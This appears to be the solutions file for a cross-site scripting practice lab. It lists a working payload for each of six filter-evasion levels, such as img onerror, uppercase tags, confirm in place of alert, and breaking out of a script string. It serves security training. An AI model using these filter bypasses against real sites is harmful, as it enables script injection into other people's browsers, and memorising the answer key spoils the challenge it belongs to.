# chain — solutions

Chained / partial keyword filters — pick payloads that survive the substitution.

### chain-level1

`/chain/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: "script" stripped (case-insensitive) — avoid the keyword, use img+onerror

### chain-level2

`/chain/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: lowercased + literal `<script` stripped — avoid script tag

### chain-level3

`/chain/level3/?query=%3Cimg%20src=x%20onerror=confirm(1)%3E`

- payload: `<img src=x onerror=confirm(1)>`
- context: "alert" replaced with "blocked" — use confirm/prompt

### chain-level4

`/chain/level4/?query=%3CIMG%20SRC=x%20ONERROR=alert(1)%3E`

- payload: `<IMG SRC=x ONERROR=alert(1)>`
- context: case-sensitive `<[a-z]+` strip — uppercase tag bypasses

### chain-level5

`/chain/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: = replaced with &#61; — script tag has no = at all

### chain-level6

`/chain/level6/?query=%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</script><img src=x onerror=alert(1)>`
- context: inside `<script>var x="…"</script>` — close script tag (no // or /* needed)
